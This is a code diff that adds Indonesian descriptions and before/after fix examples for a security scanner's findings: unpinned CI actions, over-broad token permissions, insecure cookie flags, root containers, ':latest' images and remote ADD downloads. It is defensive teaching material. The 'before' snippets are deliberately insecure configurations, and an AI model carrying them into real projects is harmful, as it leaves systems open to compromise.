+      'Workflow menggunakan action pihak ketiga yang direferensikan lewat tag atau branch (mis. "@v1", "@main") alih-alih commit SHA. Siapa pun yang mengelolanya — atau siapa pun yang membobol akunnya — bisa memindahkan referensi itu ke commit lain kapan saja, secara diam-diam mengubah apa yang berjalan di CI, dengan akses ke secret-nya. Commit SHA selalu menunjuk ke kode yang persis sama.',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, dikunci ke commit SHA — perbarui SHA-nya saat Anda memperbarui versinya`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "Workflow memberikan dirinya semua izin token alih-alih hanya yang digunakan",
+    description:
+      '"permissions: write-all" memberikan GITHUB_TOKEN workflow akses tulis ke segalanya — issue, pull request, paket, deployment — bahkan jika workflow hanya menggunakan sebagiannya. Jika sebuah langkah dalam workflow dibobol (dependensi jahat, skrip yang disuntikkan), izin yang lebih luas itu meningkatkan apa yang bisa dilakukan oleh siapa pun yang mengeksploitasinya.',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # hanya izin yang benar-benar digunakan workflow`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "Cookie sesi atau autentikasi diatur tanpa flag Secure dan HttpOnly",
+    description:
+      'Cookie dengan nama yang menyerupai session/auth/token diatur tanpa "httpOnly" dan "secure" di antara opsinya. Tanpa httpOnly, JavaScript di halaman — termasuk kode yang disuntikkan lewat XSS — bisa membaca cookie itu. Tanpa secure, cookie itu juga bisa dikirim lewat koneksi HTTP yang tidak terenkripsi.',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "Dependensi rentan:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "Belum ada versi perbaikan yang diketahui — pertimbangkan paket alternatif atau ikuti pembaruan proyek."
+      ),
+    },
+  }),
+  "docker-missing-user": {
+    title: "Dockerfile tidak mengatur pengguna non-root",
+    description:
+      "Tidak ada instruksi USER di Dockerfile: tanpa itu, container berjalan sebagai root. Jika penyerang berhasil menjalankan kode di dalam container (mis. dengan mengeksploitasi pustaka yang rentan), menjadi root di dalam container membuat pelarian ke host — atau dampak yang lebih luas pada sistem sekitarnya — menjadi lebih mudah.",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Manifest Kubernetes tidak secara eksplisit mewajibkan eksekusi sebagai pengguna non-root",
+    description:
+      'Tidak ada "runAsNonRoot" di mana pun dalam manifest (baik di tingkat pod maupun container): tanpa mengaturnya, container berjalan sebagai pengguna apa pun yang didefinisikan image-nya — sering kali root secara default, jika image itu sendiri belum mengubahnya. Mengaturnya secara eksplisit ke true membuat pod gagal dimulai jika image tetap mencoba berjalan sebagai root, alih-alih baru diketahui setelah terjadi insiden.',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Image dasar Dockerfile menggunakan tag ":latest"',
+    description:
+      '"latest" berubah seiring waktu: build yang sama, diulang di waktu lain, bisa mendapatkan versi image dasar yang berbeda — build yang tidak reproducible, dan pembaruan yang tidak diinginkan bisa datang tanpa ada yang memutuskannya. Sebuah instruksi FROM secara eksplisit menggunakan tag ":latest" alih-alih versi yang presisi.',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfile mengunduh file jarak jauh dengan ADD alih-alih COPY",
+    description:
+      "Instruksi ADD dengan URL http/https mengunduh file dari internet selama build, tanpa pemeriksaan integritas dan tanpa konten yang terlihat di repositori. Jika URL itu pernah dibobol, build akan menyertakan konten arbitrer tanpa ada yang menyadarinya hanya dengan membaca Dockerfile.",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash yang diharapkan>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
 },
 };
